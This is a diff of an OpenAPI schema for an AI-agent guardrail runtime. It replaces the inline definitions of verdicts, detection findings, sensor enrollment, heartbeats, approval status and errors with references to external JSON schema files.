-          description: The class of transformation.
-        spans:
-          type: array
-          items:
-            $ref: "#/components/schemas/ModificationSpan"
-          description: Span-level edits to apply, for `redact`/`rewrite`.
-        payload:
-          type: object
-          description: Full replacement or constraint payload, when spans are not enough.
-
-    VerdictFinding:
-      type: object
-      description: |
-        One concrete detection backing the verdict. Findings MAY carry
-        `x.ogr.*` extension keys (e.g. `x.ogr.whitelisted`); clients MUST
-        pass through keys they do not understand.
-      required: [category]
-      additionalProperties: true
-      properties:
-        category:
-          type: string
-          pattern: "^(safety|security|privacy|x)\\.[a-z0-9_.]+$"
-          description: Taxonomy category of the finding.
-        path:
-          type: string
-          description: JSON-pointer-like path to the matched text within the event payload.
-        start:
-          type: integer
-          minimum: 0
-          description: Start offset of the matched span.
-        end:
-          type: integer
-          minimum: 0
-          description: End offset of the matched span.
-        score:
-          type: number
-          minimum: 0
-          maximum: 1
-          description: Detector's confidence for this finding.
-        detector:
-          type: string
-          description: The detector that produced this finding.
-
+      $ref: "./guard-event.schema.json"
     Verdict:
-      type: object
-      description: |
-        A detector's decision about a GuardEvent. The canonical JSON Schema
-        (`schema/verdict.schema.json`) closes this object; the sanctioned
-        exception is extension keys, which a runtime MAY add on the wire:
-        `x.ogr.*` (e.g. `x.ogr.session_id`, `x.ogr.redaction_map`,
-        `x.ogr.output_mode`, `x.ogr.unjudged`, `x.ogr.whitelisted`) and
-        vendor keys under `x.<vendor>.*`. Clients MUST pass through
-        extension keys they do not understand. This wire schema therefore
-        allows additional properties to admit those keys.
-      required: [ogr_version, event_id, guard_id, provider, decision]
-      additionalProperties: true
-      properties:
-        ogr_version:
-          type: string
-          const: "0.6"
-          description: Canonical schema version of this verdict.
-        event_id:
-          type: string
-          minLength: 1
-          description: >-
-            Runtime-assigned identity of the judged event, returned to the
-            caller here — clients never mint event ids.
-        guard_id:
-          type: string
-          minLength: 1
-          description: >-
-            The event's guard group: the client's propagated value when one
-            was sent, else runtime-assigned. What `GET /v1/approvals` polls
-            by.
-        provider:
-          type: string
-          minLength: 1
-          description: Which detector/provider produced the decision.
-        decision:
-          type: string
-          enum: [allow, block, require_approval, modify, redact]
-          description: |
-            What the PEP must do with the held action: let it proceed
-            (`allow`), stop it (`block`), hold for a human
-            (`require_approval` — poll `GET /v1/approvals`), or apply
-            `modifications` before proceeding (`modify`, `redact`).
-        latency_ms:
-          type: number
-          minimum: 0
-          description: Detector-side latency in milliseconds.
-        reasons:
-          type: array
-          items:
-            type: string
-          description: Human/machine-readable reason codes, typically category ids.
-        categories:
-          type: array
-          items:
-            $ref: "#/components/schemas/VerdictCategory"
-          description: Taxonomy categories matched, with scores.
-        modifications:
-          $ref: "#/components/schemas/Modifications"
-        findings:
-          type: array
-          items:
-            $ref: "#/components/schemas/VerdictFinding"
-          description: Concrete detections backing the decision.
-
-    IngestResult:
-      type: object
-      description: The outcome of one event in an ingest batch, in request order.
-      required: [id, status]
-      properties:
-        id:
-          type: ["string", "null"]
-          description: The runtime-assigned `event_id` of the accepted element, or `null` for a rejected one.
-        status:
-          type: integer
-          description: >-
-            Per-event HTTP-style status: `201` recorded, `400` failed
-            validation.
-        error:
-          type: string
-          description: Human-readable validation error, present when `status` is not 2xx.
-
-    EnrollRequest:
-      type: object
-      required: [public_key]
-      properties:
-        public_key:
-          type: string
-          description: base64url encoding of the raw 32-byte Ed25519 public key.
-        pep_id:
-          type: string
-          description: >-
-            Optional stable PEP id to bind the key to. Names the ENROLLING
-            SENSOR — unrelated to the per-action `guard_id` on events.
-        name:
-          type: string
-          description: Optional display name for the enrolled PEP.
-
-    EnrollCreated:
-      type: object
-      description: First enrollment of this key in the organization.
-      required: [pep_id, key_id, max_attestation]
-      properties:
-        pep_id:
-          type: string
-          description: The PEP id the key was bound to (supplied or generated).
-        key_id:
-          type: string
-          description: >-
-            Key identifier to use as `kid` in the `ogr-batch-signature`
-            protected header.
-        max_attestation:
-          type: string
-          description: The highest attestation level this enrollment can confer.
-
-    EnrollExisting:
-      type: object
-      description: Idempotent re-enrollment of a key already bound to this organization.
-      required: [pep_id, key_id]
-      properties:
-        pep_id:
-          type: string
-          description: The PEP id the key is bound to.
-        key_id:
-          type: string
-          description: >-
-            Key identifier to use as `kid` in the `ogr-batch-signature`
-            protected header.
-
-    HeartbeatRequest:
-      type: object
-      description: >-
-        A transport-level liveness report — not a GuardEvent, carries no
-        guarded action. At least one of `sensor_id` or `agent_id` is
-        required; fields are flat, like every other identity field.
-      anyOf:
-        - required: [sensor_id]
-        - required: [agent_id]
-      properties:
-        agent_id:
-          type: string
-          minLength: 1
-          description: >-
-            The acting agent, unique within the organization. Behind a gateway
-            the authenticated caller id is the natural value. Absent, the
-            runtime derives an id from the API key (the identity floor).
-        agent_type:
-          type: string
-          description: >-
-            What kind of agent — the harness (`hermes`, `openclaw`) or the
-            deployment's own name for it (`smartwork`). A label, not an
-            identity: a second value for one agent_id raises the shadow-agent
-            signal, never a fork of the inventory.
-        agent_workspace:
-          type: string
-          description: >-
-            The named group of AGENTS this one belongs to, resolved only
-            inside the tenant the key proves. Absent, the key's workspace.
-        agent_owner:
-          type: string
-          description: The agent's builder / responsible party. An attribute, never a policy boundary.
-        agent_user:
-          type: string
-          description: Who is using the agent THIS session. Absent, every session is one user.
-        sandbox_id:
-          type: string
-          description: Sandbox instance the agent runs in, if any.
-        parent_agent_id:
-          type: string
-          description: Spawning agent, for sub-agents.
-        delegation_chain:
-          type: array
-          items:
-            type: string
-          description: Agent ids from root to this agent, for delegated work.
-        attestation:
-          type: string
-          enum: [self_declared, inferred, network, mtls, gateway_api_key, client_key]
-          description: >-
-            How the PEP verified the identity fields; clamped by the runtime
-            to the channel's attestation ceiling.
-        sensor_id:
-          type: string
-          minLength: 1
-          description: Stable id of the reporting integration, e.g. `ogr.ebpf.sensor`.
-        sensor_type:
-          type: string
-          enum: [in_process, wrapper, proxy, kernel]
-          description: >-
-            How evadable the observer is, weakest first. Absent, consumers
-            MUST treat the sensor as bypassable.
-        sensor_version:
-          type: string
-          description: Sensor software version, for triaging a bad rollout.
-        interval_s:
-          type: number
-          description: >-
-            The interval, in seconds, at which this PEP intends to
-            heartbeat; lets the runtime decide when it "went dark".
-        counters:
-          type: object
-          additionalProperties:
-            type: number
-          description: >-
-            Free-form monotonic counters since PEP start, e.g.
-            `events_sent`, `evaluate_errors`.
-
-    ApprovalStatus:
-      type: object
-      required: [status]
-      properties:
-        status:
-          type: string
-          enum: [pending, approved, denied, expired]
-          description: Current state of the approval request.
-        decided_at:
-          type: string
-          format: date-time
-          description: When the human decided, for terminal states.
-
-    Error:
-      type: object
-      description: >-
-        Common error envelope. `error` is a stable machine-readable code;
-        `details` appears on `invalid_event` responses; `limit` appears on
-        `rate_limited` responses.
-      required: [error]
-      properties:
-        error:
-          type: string
-          description: >-
-            Machine-readable error code, e.g. `invalid_event`,
-            `invalid_body`, `unauthorized`, `key_revoked`,
-            `invalid_public_key`, `rate_limited`.
-        details:
-          type: array
-          items:
-            type: string
-          description: Per-field validation issues (present on `invalid_event`).
-        limit:
-          type: integer
-          description: The API key's rate limit in requests per minute (present on `rate_limited`).
+      $ref: "./verdict.schema.json"
